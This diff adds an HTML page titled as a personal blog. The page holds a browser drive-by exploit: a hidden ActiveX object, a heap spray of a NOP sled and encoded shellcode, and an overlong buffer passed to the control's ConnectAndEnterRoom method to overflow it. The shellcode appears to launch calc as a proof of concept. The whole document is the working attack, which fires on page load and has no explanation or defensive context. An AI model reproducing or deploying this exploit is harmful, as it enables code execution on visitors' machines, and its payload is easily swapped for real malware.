@@ -1,0 +1,27 @@
+&lt;html&gt;   
+&lt;title&gt;7jdg&#039;s Blog&lt;/title&gt;   
+&lt;object classid=&quot;clsid:AE93C5DF-A990-11D1-AEBD-5254ABDD2B69&quot; id=&#039;target&#039; style=&#039;display:none&#039;&gt;&lt;/object&gt;   
+&lt;body&gt;   
+&lt;SCRIPT language=&quot;javascript&quot;&gt;   
+var shellcode = unescape(&quot;%uE8FC%u0044%u0000%u458B%u8B3C%u057C%u0178%u8BEF%u184F%u5F8B%u0120%u49EB%u348B%u018B%u31EE%u99C0%u84AC%u74C0%uC107%u0DCA%uC201%uF4EB%u543B%u0424%uE575%u5F8B%u0124%u66EB%u0C8B%u8B4B%u1C5F%uEB01%u1C8B%u018B%u89EB%u245C%uC304%uC031%u8B64%u3040%uC085%u0C78%u408B%u8B0C%u1C70%u8BAD%u0868%u09EB%u808B%u00B0%u0000%u688B%u5F3C%uF631%u5660%uF889%uC083%u507B%u7E68%uE2D8%u6873%uFE98%u0E8A%uFF57%u63E7%u6C61%u0063&quot;);      
+    var bigblock = unescape(&quot;%u9090%u9090&quot;);    
+    var headersize = 20;    
+    var slackspace = headersize + shellcode.length;    
+    while (bigblock.length &lt; slackspace)    
+        bigblock += bigblock;    
+    fillblock = bigblock.substring(0, slackspace);    
+    block = bigblock.substring(0, bigblock.length - slackspace);    
+    while (block.length + slackspace &lt; 0x40000)    
+        block = block + block + fillblock;    
+    memory = new Array();    
+    for (x = 0; x &lt; 300; x++)    
+        memory[x] = block + shellcode;    
+    var buffer = &#039;&#039;;    
+    while (buffer.length &lt; 164)    
+        buffer += &quot;A&quot;;    
+    buffer = buffer + &quot;\x0a\x0a\x0a\x0a&quot; + buffer;    
+    ok = &quot;ok&quot;;    
+    target.ConnectAndEnterRoom(buffer, ok, ok, ok, ok, ok);    
+&lt;/script&gt;   
+&lt;/body&gt;   
+&lt;/html&gt;
